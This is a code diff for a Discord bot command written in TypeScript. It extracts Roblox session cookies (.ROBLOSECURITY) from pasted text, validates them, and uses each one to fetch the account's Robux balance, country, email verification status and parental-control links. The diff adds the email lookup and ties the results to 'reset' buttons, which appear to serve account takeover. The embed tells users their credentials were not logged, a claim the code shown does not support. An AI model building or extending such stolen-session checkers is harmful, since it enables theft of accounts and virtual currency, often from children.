@@ -9,7 +9,7 @@ import {
 } from 'discord.js';
 import axios from 'axios';
 import { validateCookie } from '../roblox';
-import { buildInitialButtons as storeAndBuildRow } from './bypass';
+import { buildInitialButtons as storeAndBuildRow } from './reset';
 import type { Command } from './types';
 
 const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
@@ -17,9 +17,7 @@ const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
 
 function extractCookies(text: string): string[] {
   const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
-  const fullBareValues = new Set(
-    fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)),
-  );
+  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
   const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
     .map((m) => m[0])
     .filter((v) => !fullBareValues.has(v));
@@ -27,48 +25,30 @@ function extractCookies(text: string): string[] {
   const result: string[] = [];
   for (const full of fullMatches) {
     const bare = full.slice(full.indexOf('|_CAEQ') + 2);
-    if (!seen.has(bare)) {
-      seen.add(bare);
-      result.push(full);
-    }
+    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
   }
   for (const bare of bareMatches) {
-    if (!seen.has(bare)) {
-      seen.add(bare);
-      result.push(bare);
-    }
+    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
   }
   return result;
 }
 
-async function fetchTransactionTotals(cookie: string, userId: string): Promise<{ incoming: number; outgoing: number }> {
+async function fetchRobux(cookie: string, userId: string): Promise<number> {
   try {
-    const url = `https://apis.roblox.com/transaction-records/v1/users/${userId}/transaction-totals?usedTypes=2228224&timeFrame=Year&transactionType=summary`;
-    const resp = await axios.get(url, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-      },
+    const resp = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
       validateStatus: () => true,
       timeout: 10000,
     });
-    if (resp.status === 200 && resp.data) {
-      return {
-        incoming: resp.data.incomingRobuxTotal || 0,
-        outgoing: resp.data.outgoingRobuxTotal || 0,
-      };
-    }
+    if (resp.status === 200 && resp.data) return resp.data.robux || 0;
   } catch {}
-  return { incoming: 0, outgoing: 0 };
+  return 0;
 }
 
 async function fetchCountry(cookie: string): Promise<string> {
   try {
     const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-      },
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
       const data = await resp.json();
@@ -78,23 +58,30 @@ async function fetchCountry(cookie: string): Promise<string> {
   return 'Unknown';
 }
 
-async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean; canAddParent: boolean }> {
+async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null; pending: string | null }> {
   try {
-    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-      },
+    const resp = await fetch('https://accountsettings.roblox.com/v1/emails', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
       const data = await resp.json();
-      return {
-        hasParent: (data.parents && data.parents.length > 0) || false,
-        canAddParent: data.canAddParent || false,
-      };
+      return { verified: data.verifiedEmail || null, pending: data.pendingEmail || null };
     }
   } catch {}
-  return { hasParent: false, canAddParent: false };
+  return { verified: null, pending: null };
+}
+
+async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
+  try {
+    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
+    });
+    if (resp.status === 200) {
+      const data = await resp.json();
+      return { hasParent: (data.parents && data.parents.length > 0) || false };
+    }
+  } catch {}
+  return { hasParent: false };
 }
 
 const data = new SlashCommandBuilder()
@@ -171,15 +158,16 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
       validCount++;
       const { userId, username, displayName } = validation;
-      const [tx, country, parental] = await Promise.all([
-        fetchTransactionTotals(cookie, String(userId)),
+      const [robux, country, email, parental] = await Promise.all([
+        fetchRobux(cookie, String(userId)),
         fetchCountry(cookie),
+        fetchEmailInfo(cookie),
         fetchParentalControls(cookie),
       ]);
-      totalIncoming += tx.incoming;
-      totalOutgoing += tx.outgoing;
 
-      const parentStatus = parental.hasParent ? '✅ Linked' : '❌ None';
+      let emailStatus = 'No email';
+      if (email.verified) emailStatus = '✅ Verified';
+      else if (email.pending) emailStatus = '⏳ Pending';
 
       const id = Math.random().toString(36).slice(2, 10);
       const row = storeAndBuildRow(id);
@@ -194,15 +182,12 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           `⭑ **Display:** ${displayName || username}\n` +
           `⭑ **User ID:** ${userId}\n` +
           `⭑ **Country:** ${country}\n` +
+          `⭑ **Robux:** ${robux.toLocaleString()} ₽\n` +
           `────\n` +
           `✧ **Account Details**\n` +
           `────\n` +
-          `⭑ **Parental Controls:** ${parentStatus}\n` +
-          `────\n` +
-          `✧ **Robux Summary (Year)**\n` +
-          `────\n` +
-          `⭑ **Incoming:** ${tx.incoming.toLocaleString()} ₽\n` +
-          `⭑ **Outgoing:** ${tx.outgoing.toLocaleString()} ₽\n` +
+          `⭑ **Email:** ${emailStatus}\n` +
+          `⭑ **Parental Controls:** ${parental.hasParent ? '✅ Linked' : '❌ None'}\n` +
           `────\n` +
           `⭑ Your credentials were not logged.`
         )
@@ -217,8 +202,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       .setDescription(
         validCount === 0
           ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
-          : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Incoming:** ${totalIncoming.toLocaleString()} ₽\n⭑ **Total Outgoing:** ${totalOutgoing.toLocaleString()} ₽`
+          : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}`
       )
+      .setImage('https://files.catbox.moe/955g15.gif')
       .setFooter(footerData);
 
     await interaction.followUp({ embeds: [summaryEmbed], ephemeral: true });
@@ -226,11 +212,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const embed = new EmbedBuilder()
       .setTitle('𖣐 Error .ᐟ')
       .setColor('#FFFFFF')
-      .setDescription(
-        `✧ **Unexpected Error**\n` +
-        `────\n` +
-        `⭑ ${error.message || 'Something went wrong.'}`
-      )
+      .setDescription(`✧ **Unexpected Error**\n────\n⭑ ${error.message || 'Something went wrong.'}`)
       .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
     await interaction.editReply({ embeds: [embed] });
   }
